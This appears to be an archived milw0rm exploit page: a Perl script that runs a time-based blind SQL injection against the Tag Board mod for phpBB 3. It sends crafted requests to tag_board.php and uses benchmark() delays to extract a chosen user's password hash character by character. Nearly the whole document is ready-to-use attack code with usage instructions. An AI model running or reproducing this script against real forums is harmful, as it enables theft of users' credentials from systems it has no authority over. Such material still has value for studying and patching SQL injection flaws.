<html><head><title>phpBB 3 (Mod Tag Board <= 4) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl 
# ---------------------------------------------------------------
# phpBB 3 (Mod Tag Board &lt;= 4) Remote Blind SQL Injection Exploit  
# by athos - staker[at]hotmail[dot]it
# http://bx67212.netsons.org/forum/viewforum.php?f=3
# ---------------------------------------------------------------
# Note: Works regardless PHP.ini settings!
# Thanks meh also know as cHoBi
# ---------------------------------------------------------------

use strict;
use LWP::UserAgent;

my ($hash,$time1,$time2);

my @chars = (48..57, 97..102); 
my $http  = new LWP::UserAgent;

my $host  = shift;
my $table = shift;
my $myid  = shift or &amp;usage;


sub injection
{
    my ($sub,$char) = @_;
    
    return &quot;/tag_board.php?mode=controlpanel&amp;action=delete&amp;id=&quot;.
           &quot;1+and+(select+if((ascii(substring(user_password,${sub},1)&quot;.
           &quot;)=${char}),benchmark(230000000,char(0)),0)+from+${table}_us&quot;.
           &quot;ers+where+user_id=${myid})--&quot;;
}


sub usage
{
    print STDOUT &quot;Usage: perl $0 [host] [table_prefix] [user_id]\n&quot;;
    print STDOUT &quot;Howto: perl $0 http://localhost/phpBB phpbb 2\n&quot;;
    print STDOUT &quot;by athos - staker[at]hotmail[dot]it\n&quot;;
    exit;
}


syswrite(STDOUT,'Hash MD5: ');

for my $i(1..33)
{
    for my $j(0..16)
    {
        $time1 = time();

        $http-&gt;get($host.injection($i,$chars[$j]));
        
        $time2 = time();

        if($time2 - $time1 &gt; 6)
        {
            syswrite(STDOUT,chr($chars[$j]));
            $hash .= chr($chars[$j]); 
            last;
        }
        
        if($i == 1 &amp;&amp; length $hash &lt; 0)
        {
            syswrite(STDOUT,&quot;Exploit Failed!\n&quot;);
            exit;
        } 
    }
}

# milw0rm.com [2008-12-08]</pre></html>